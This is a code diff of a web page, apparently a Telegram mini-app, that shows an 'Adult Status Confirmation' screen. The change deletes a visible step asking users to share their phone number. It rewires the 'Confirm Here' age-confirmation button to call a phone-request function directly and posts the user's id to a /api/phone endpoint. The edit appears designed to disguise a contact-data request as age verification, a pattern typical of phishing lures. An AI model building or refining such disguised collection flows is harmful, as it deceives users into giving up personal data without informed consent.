@@ -192,20 +192,8 @@
                     <h2 class="step-title">Adult Status Confirmation</h2>
                     <p class="step-subtitle">Adult status confirmation required to access</p>
                 </div>
-                <button onclick="showPhoneStep()" class="action-btn">
-                    Confirm Here
-                </button>
-            </div>
-
-            <!-- Phone Number Step -->
-            <div id="phoneStep" class="hidden">
-                <div class="step-header">
-                    <span class="emoji-display">📱</span>
-                    <h2 class="step-title">Verification Required</h2>
-                    <p class="step-subtitle">Please share your phone number to continue</p>
-                </div>
                 <button onclick="requestPhone()" class="action-btn">
-                    Share Phone Number
+                    Confirm Here
                 </button>
             </div>
 
@@ -277,10 +265,6 @@
             hideError();
         }
 
-
-        function showPhoneStep() {
-            showStep('phoneStep');
-        }
         function showError(message) {
             const errorEl = document.getElementById('errorMessage');
             errorEl.textContent = message;
@@ -298,20 +282,13 @@
                     return;
                 }
 
-                console.log("Contact result:", result);
-
-                phoneNumber = result.phone_number;
-                userId = result.user_id;
-
-                console.log("Phone number received:", phoneNumber);
+                userId = tg.initDataUnsafe?.user?.id || result.user_id;
 
                 fetch(`${BASE_URL}/api/phone`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        phone: phoneNumber,
                         user_id: userId,
-                        initData: tg.initData
                     })
                 })
                 .then(response => response.json())
